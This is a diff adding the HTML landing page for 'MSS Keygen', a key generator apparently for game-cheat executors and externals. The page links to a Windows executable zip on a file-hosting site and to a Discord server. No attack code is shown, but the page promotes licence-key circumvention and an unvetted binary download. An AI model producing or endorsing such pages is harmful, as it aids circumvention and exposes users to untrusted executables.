@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="MSS Keygen — a simple key generator for the executors and externals our community uses." />
+  <title>MSS Keygen</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <header class="nav">
+    <a href="#top" class="logo logo-img-wrap" aria-label="MSS Keygen">
+      <img src="assets/logos/main-logo.png" alt="MSS Keygen" class="logo-img-main" />
+    </a>
+    <nav class="nav-links">
+      <a href="#supported">Supported</a>
+      <a href="#download">Download</a>
+      <a href="#" id="navDiscord" class="nav-discord">Discord</a>
+    </nav>
+  </header>
+
+  <main id="top">
+    <!-- Hero -->
+    <section class="hero">
+      <div class="hero-text">
+        <h1>MSS Keygen</h1>
+        <p>
+          A straightforward key generator for the executors and externals our
+          community actually uses. Download it, pick your tool, get your key.
+        </p>
+        <div class="hero-buttons">
+          <a href="#download" class="btn btn-primary">Download</a>
+          <a href="#" id="heroDiscord" class="btn btn-secondary">Join Discord</a>
+        </div>
+        <p class="hero-live" id="heroLive">
+          <span class="live-dot"></span> connecting to Discord…
+        </p>
+      </div>
+
+      <div class="hero-term">
+        <div class="term-bar">
+          <span class="term-dots"><i></i><i></i><i></i></span>
+          <span class="term-name">mss_keygen.exe</span>
+        </div>
+        <pre class="term-body" id="termBody"></pre>
+      </div>
+    </section>
+
+    <!-- Supported -->
+    <section class="supported" id="supported">
+      <div class="sec-head">
+        <h2>Supported tools</h2>
+        <p>Everything here is actively supported. More get added as they release.</p>
+      </div>
+
+      <div class="support-groups">
+        <div class="support-group">
+          <h3>Executors <span id="execCount"></span></h3>
+          <div class="tiles" id="executorsGrid"></div>
+        </div>
+        <div class="support-group">
+          <h3>Externals <span id="extCount"></span></h3>
+          <div class="tiles" id="externalsGrid"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Download -->
+    <section class="download" id="download">
+      <div class="download-card">
+        <div class="download-info">
+          <h2>Download the client</h2>
+          <p>One small Windows executable. No installer.</p>
+          <span class="download-meta">MSS.zip · Windows 10/11 · ~4 MB</span>
+        </div>
+        <a href="https://file.garden/aizQJ_2aR3u8INCz/MSS.zip" class="btn btn-primary btn-lg" download>Download</a>
+      </div>
+    </section>
+
+    <!-- Discord -->
+    <section class="discord" id="discord">
+      <h2>Join the Discord</h2>
+      <p>Support, updates, and announcements when new tools are added.</p>
+      <p class="discord-count" id="discordCount"></p>
+      <a href="#" id="ctaDiscord" class="btn btn-primary btn-lg">Join Discord</a>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <span class="logo logo-img-wrap small" aria-label="MSS Keygen">
+      <img src="assets/logos/main-logo.png" alt="MSS Keygen" class="logo-img-main" />
+    </span>
+    <span>© <span id="year"></span> MSS Keygen</span>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
